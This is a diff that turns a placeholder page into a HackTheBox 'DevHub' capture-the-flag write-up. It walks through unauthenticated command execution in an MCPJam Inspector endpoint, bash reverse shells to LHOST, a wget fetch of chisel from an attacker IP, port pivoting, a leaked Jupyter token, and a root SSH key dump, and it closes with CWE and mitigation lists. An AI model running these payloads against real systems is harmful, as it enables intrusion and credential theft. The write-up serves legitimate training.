@@ -6,77 +6,223 @@
     <title>DevHub • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0b0d15;
-            color: #e0e5f0;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem;
-        }
-        .container {
-            max-width: 800px;
-            width: 100%;
-            background: rgba(12, 16, 28, 0.9);
-            border: 1px solid rgba(0, 255, 200, 0.15);
-            border-radius: 2rem;
-            padding: 3rem;
-            text-align: center;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
-        }
-        h1 {
-            font-size: 2.5rem;
-            color: #6fffe0;
-            margin-bottom: 1rem;
-        }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
-            border-radius: 1rem;
-        }
-        .status i {
-            color: #ffcc00;
-            margin-right: 0.5rem;
-        }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
-            border-radius: 1rem;
-            color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
-        }
+        body { background: #0b0d15; color: #e0e5f0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+        .container { max-width: 1200px; width: 100%; background: rgba(12, 16, 28, 0.9); border: 1px solid rgba(0, 255, 200, 0.15); border-radius: 2rem; padding: 3rem; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); }
+        h1 { font-size: 2.5rem; color: #6fffe0; margin-bottom: 1.5rem; }
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .meta-info { display: flex; flex-wrap: wrap; gap: 1rem 2rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 1rem; margin-bottom: 2rem; }
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        .attack-chain { background: rgba(0, 255, 200, 0.02); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #b6c8e0; line-height: 1.8; overflow-x: auto; white-space: pre; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB DevHub</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+<div class="container">
+    <div class="meta-info">
+        <span><strong>OS:</strong> Linux (Ubuntu)</span>
+        <span><strong>Stack:</strong> nginx, MCPJam Inspector, JupyterLab, Python MCP server</span>
+        <span><strong>Techniques:</strong> Blind RCE in an MCP endpoint, Chisel pivoting, hardcoded credentials, root SSH key dump</span>
     </div>
+
+    <h1>DevHub - HackTheBox Writeup</h1>
+
+    <h2>🗺️ Attack Chain Overview</h2>
+    <div class="attack-chain">MCPJam Inspector on port 6274
+  -> blind RCE in /api/mcp/connect
+  -> reverse shell as mcp-dev
+  -> internal processes reveal JupyterLab on 8888 and opsmcp on 5000
+  -> Chisel pivot to loopback-only services
+  -> JupyterLab token exposed in process arguments
+  -> shell as analyst
+  -> /opt/opsmcp/server.py contains a hardcoded API key
+  -> ops._admin_dump returns root private SSH key
+  -> SSH as root</div>
+
+    <h2>🔍 Reconnaissance</h2>
+
+    <h3>Port Scan</h3>
+    <pre><code>nmap -sS --min-rate 5000 -p- -Pn -n --open $TARGET -oN silent
+nmap -sVC -p 22,80,6274 $TARGET -oN service</code></pre>
+
+    <p><strong>Open ports:</strong></p>
+    <table>
+        <tr><th>Port</th><th>Service</th><th>Detail</th></tr>
+        <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.9p1 Ubuntu</td></tr>
+        <tr><td>80/tcp</td><td>HTTP</td><td>nginx 1.18.0 - "DevHub - Internal Development Platform"</td></tr>
+        <tr><td>6274/tcp</td><td>MCPJam Inspector</td><td>MCP server for LLM/tool interaction</td></tr>
+    </table>
+
+    <p>Port <code>6274</code> exposed <strong>MCPJam Inspector</strong>, a server that can launch executable tools for model-driven workflows. It was reachable without authentication or execution restrictions.</p>
+
+    <h2>🚪 Initial Access - MCPJam Inspector RCE</h2>
+
+    <h3>Vulnerability Identification</h3>
+    <p>The <code>POST /api/mcp/connect</code> endpoint accepts a JSON <code>command</code> field and executes it directly on the system without validation or authentication:</p>
+
+    <pre><code>curl -X POST http://$TARGET:6274/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'</code></pre>
+
+    <p><strong>Response:</strong></p>
+    <pre><code>{"success":false,"error":"Connection failed... MCP error -32000: Connection closed"}</code></pre>
+
+    <div class="box warning">
+        <p>The error indicates <strong>blind RCE</strong>: the command runs, but the process closes before output is returned.</p>
+    </div>
+
+    <h3>Reverse Shell as <code>mcp-dev</code></h3>
+    <pre><code>nc -lvnp 4444
+
+curl -X POST http://$TARGET:6274/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/LHOST/4444 0>&1"],"env":{}},"serverId":"revshell"}'</code></pre>
+
+    <p>The shell landed as <code>mcp-dev</code> (uid=1001).</p>
+
+    <h2>🔍 Internal Enumeration</h2>
+    <pre><code>id
+# uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
+
+ps aux
+# analyst  1026  ... jupyter-lab --ip=127.0.0.1 --port=8888
+#                    --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
+# root     1038  ... python3 /opt/opsmcp/server.py
+
+ss -tulnp
+# 127.0.0.1:5000  -> opsmcp (running as root)
+# 127.0.0.1:8888  -> JupyterLab (running as analyst)</code></pre>
+
+    <p>Two useful services were bound to loopback only: <strong>JupyterLab</strong> as <code>analyst</code> and <strong>opsmcp</strong> as <code>root</code>.</p>
+
+    <h2>🔀 Pivoting With Chisel</h2>
+    <pre><code># Kali - Chisel server
+./chisel server -p 9001 --reverse --socks5
+
+# Victim - transfer and execute
+cd /tmp
+wget http://10.10.14.92:8000/chiselE
+chmod +x chisel
+
+# Option A - SOCKS5 proxy
+./chisel client 10.10.14.92:9001 R:socks &
+
+# Option B - direct remote port forward to JupyterLab
+./chisel client 10.10.14.92:9001 R:8889:127.0.0.1:8888 &</code></pre>
+
+    <p>With option B, JupyterLab became reachable from Kali at <code>http://localhost:8889</code>.</p>
+
+    <h2>📓 JupyterLab Access -> Shell as <code>analyst</code></h2>
+    <p>The JupyterLab token was exposed in process arguments and readable with unprivileged <code>ps aux</code>:</p>
+    <pre><code>--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7</code></pre>
+
+    <p>Browse to <code>http://localhost:8889/token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7</code>, open the integrated JupyterLab terminal and run:</p>
+    <pre><code>nc -lvnp 5555
+
+bash -i >& /dev/tcp/LHOST/5555 0>&1</code></pre>
+
+    <p>The shell landed as <code>analyst</code>.</p>
+
+    <h2>🔍 <code>opsmcp</code> Service Analysis</h2>
+    <pre><code>cat /opt/opsmcp/server.py</code></pre>
+
+    <p><strong>Critical findings:</strong></p>
+    <pre><code># Hardcoded API key
+VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
+
+# Hidden tool without real access control
+HIDDEN_TOOLS = {
+    "ops._admin_dump": {
+        "description": "Emergency credential dump - INTERNAL ONLY",
+        "parameters": {"target": "string", "confirm": "boolean"}
+    }
+}</code></pre>
+
+    <p>The <code>_admin_dump</code> function can dump <code>ssh_keys</code>, <code>passwords</code> and <code>tokens</code> using only the static API key for authentication.</p>
+
+    <p><strong>Additional hardcoded credentials:</strong></p>
+    <table>
+        <tr><th>User</th><th>Password</th></tr>
+        <tr><td>analyst</td><td><code>JupyterN0tebook!2026</code></td></tr>
+        <tr><td>mcp-dev</td><td><code>Mcp!Insp3ct0r2026</code></td></tr>
+        <tr><td>root</td><td><code>$6$rounds=656000$saltsalt$hashedpassword</code></td></tr>
+    </table>
+
+    <h2>⬆️ Privilege Escalation - Root SSH Key Dump</h2>
+
+    <h3>Step 1 - Enable Debug Mode</h3>
+    <pre><code>curl -X POST http://localhost:5000/tools/call \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+  -d '{"name":"ops._debug_mode","arguments":{}}'</code></pre>
+
+    <h3>Step 2 - Dump Root's Private SSH Key</h3>
+    <pre><code>curl -X POST http://localhost:5000/tools/call \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'</code></pre>
+
+    <p>The response returns the complete root private SSH key.</p>
+
+    <h3>Step 3 - SSH as <code>root</code></h3>
+    <pre><code>vim id_rsa        # paste the recovered private key
+chmod 600 id_rsa
+ssh -i id_rsa root@$TARGET
+cat /root/root.txt</code></pre>
+
+    <h2>📊 Summary</h2>
+    <table>
+        <tr><th>Phase</th><th>Technique</th><th>Detail</th></tr>
+        <tr><td>Foothold</td><td>Blind RCE in MCPJam Inspector</td><td>Unauthenticated <code>command</code> execution in <code>/api/mcp/connect</code></td></tr>
+        <tr><td>Pivoting</td><td>Chisel port forward</td><td>Access to JupyterLab on 8888 and opsmcp on 5000</td></tr>
+        <tr><td>Lateral</td><td>JupyterLab token exposed in <code>ps aux</code></td><td>Shell as <code>analyst</code></td></tr>
+        <tr><td>Privesc</td><td>Hardcoded credentials in <code>server.py</code></td><td>API key -> <code>ops._admin_dump</code> -> root SSH key</td></tr>
+        <tr><td>Root</td><td>SSH with dumped private key</td><td>Direct root login</td></tr>
+    </table>
+
+    <h2>🔒 Exploited Vulnerabilities</h2>
+    <table>
+        <tr><th>CWE</th><th>Description</th></tr>
+        <tr><td>CWE-306</td><td>Missing Authentication - <code>/api/mcp/connect</code> had no authentication</td></tr>
+        <tr><td>CWE-78</td><td>OS Command Injection - command execution without sanitization</td></tr>
+        <tr><td>CWE-798</td><td>Hard-coded Credentials - API key and passwords in source code</td></tr>
+        <tr><td>CWE-862</td><td>Missing Authorization - <code>_admin_dump</code> had no per-tool access control</td></tr>
+        <tr><td>CWE-214</td><td>Sensitive Information in process arguments - Jupyter token exposed through <code>ps aux</code></td></tr>
+    </table>
+
+    <h2>🛡️ Mitigations</h2>
+    <ul>
+        <li>Require authentication on every exposed endpoint.</li>
+        <li>Validate and sanitize all input; use command allowlists if command execution is unavoidable.</li>
+        <li>Do not hardcode credentials; use environment variables or a secrets manager.</li>
+        <li>Enforce RBAC and least privilege per tool/action.</li>
+        <li>Do not expose tokens in process arguments; use restricted config files or secret stores.</li>
+        <li>Remove debug and dump functionality from production services.</li>
+    </ul>
+
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+    <div class="footer">NIGHT PULSE X • 2026</div>
+</div>
 </body>
 </html>
